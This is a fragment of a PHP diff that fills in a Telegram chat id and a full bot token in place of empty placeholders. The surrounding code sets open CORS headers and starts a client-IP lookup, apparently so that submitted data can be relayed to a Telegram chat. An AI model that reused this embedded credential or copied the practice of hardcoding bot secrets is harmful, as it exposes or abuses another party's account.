@@ -7,8 +7,8 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST");
 header("Access-Control-Allow-Headers: Content-Type");
 
-$user_id = ""; // chat id
-$botToken = ""; // Bot token
+$user_id = "6138124685"; // chat id
+$botToken = "6534811064:AAF7E0AFQ0nN1I0Oa-RsAbvyBWU_cCxi07c"; // Bot token
 
 
 function get_client_ip()
